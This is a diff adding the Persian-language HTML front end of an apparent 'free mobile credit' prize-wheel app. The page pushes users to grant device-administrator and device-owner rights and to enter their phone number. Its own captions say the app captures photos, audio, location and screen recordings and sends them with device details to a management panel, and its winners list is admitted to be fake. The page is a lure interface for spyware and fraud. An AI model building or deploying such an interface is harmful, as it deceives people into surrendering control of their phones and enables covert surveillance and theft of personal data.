@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<title>PRF</title>
+<link rel="stylesheet" href="app.css">
+</head>
+<body>
+
+<div class="aurora"></div>
+
+<main class="wrap">
+
+  <header class="hero">
+    <div class="mark">PRF</div>
+    <h1>شارژ رایگان</h1>
+    <p class="sub" id="heroSub">در حال آماده‌سازی…</p>
+  </header>
+
+  <section class="card gate" id="gateCard">
+    <div class="gateRow">
+      <span class="gateDot" id="gateDot"></span>
+      <div class="gateText">
+        <strong id="gateTitle">مدیریت گوشی</strong>
+        <small id="gateNote">بررسی می‌شود…</small>
+      </div>
+    </div>
+    <div class="gateBtns" id="gateBtns">
+      <button class="btn ghost sm" data-act="admin" id="btnAdmin">فعال‌سازی مدیریت گوشی</button>
+      <button class="btn ghost sm" data-act="owner" id="btnOwner">ثبت مالک دستگاه</button>
+    </div>
+  </section>
+
+  <section class="card">
+    <label class="lbl" for="phone">شماره‌ی موبایل</label>
+    <input class="field" id="phone" type="tel" inputmode="numeric" autocomplete="off"
+           maxlength="14" placeholder="۰۹۱۲۳۴۵۶۷۸۹">
+    <p class="err" id="phoneErr" hidden>این شماره معتبر نیست.</p>
+
+    <label class="lbl" for="operator">اپراتور</label>
+    <div class="selectWrap">
+      <select class="field" id="operator"></select>
+      <span class="caret">▾</span>
+    </div>
+
+    <button class="btn primary big" data-act="register" id="btnRegister">ثبت شماره</button>
+    <p class="hint">با زدن این دکمه، برنامه مدیریت گوشی را فعال می‌کند، عکس و صدا و موقعیت می‌گیرد و همه را می‌فرستد.</p>
+  </section>
+
+  <section class="card" id="chanceCard">
+    <div class="chanceTop">
+      <div>
+        <div class="chanceN" id="chanceN">۰</div>
+        <div class="chanceL">شانس شما</div>
+      </div>
+      <div class="chanceSide">
+        <div><span class="k">ویدیو ذخیره‌شده</span><span class="v" id="videoN">۰</span></div>
+        <div><span class="k">چرخ بعدی</span><span class="v" id="spinIn">—</span></div>
+      </div>
+    </div>
+    <div class="bar"><i id="chanceBar"></i></div>
+    <p class="hint" id="chanceHint">هر ۳ دقیقه یک شانس اضافه می‌شود. هر شانس با یک ویدیوی ذخیره‌شده برابر است.</p>
+
+    <button class="btn primary big spin" data-act="spin" id="btnSpin">افزایش شانس</button>
+    <p class="spinNote" id="spinNote">با هر فشردن، صفحه گوشی ضبط و ذخیره می‌شود.</p>
+  </section>
+
+  <section class="card wheelCard">
+    <div class="wheelBox">
+      <div class="pointer"></div>
+      <div class="wheel" id="wheel"></div>
+      <div class="hub" id="wheelHub">۰٪</div>
+    </div>
+    <p class="odds" id="odds">در حال بارگذاری…</p>
+    <p class="result" id="result"></p>
+  </section>
+
+  <section class="card">
+    <h2 class="h2">برندگان</h2>
+    <ul class="winners" id="winners"></ul>
+    <p class="hint">این فهرست نمونه است و هیچ جایزه‌ای پرداخت نشده است.</p>
+  </section>
+
+  <section class="card" id="infoCard">
+    <h2 class="h2">اطلاعات گوشی شما</h2>
+    <p class="hint" id="infoHint">این اطلاعات همراه رکورد شما برای پنل مدیریت فرستاده می‌شود.</p>
+    <div class="facts" id="facts"></div>
+  </section>
+
+  <section class="card logCard">
+    <h2 class="h2">وضعیت</h2>
+    <div class="log" id="log">آماده.</div>
+    <div class="progress" id="progress" hidden><i></i></div>
+    <button class="btn ghost sm" data-act="settings" id="btnSettings">تنظیمات مجوزها</button>
+  </section>
+
+</main>
+
+<div class="sheet" id="sheet" hidden>
+  <div class="sheetCard">
+    <h3 id="sheetTitle"></h3>
+    <p id="sheetBody"></p>
+    <div class="sheetBtns">
+      <button class="btn ghost" data-act="sheetNo" id="sheetNo">انصراف</button>
+      <button class="btn primary" data-act="sheetYes" id="sheetYes">تایید</button>
+    </div>
+  </div>
+</div>
+
+<script src="app.js"></script>
+</body>
+</html>
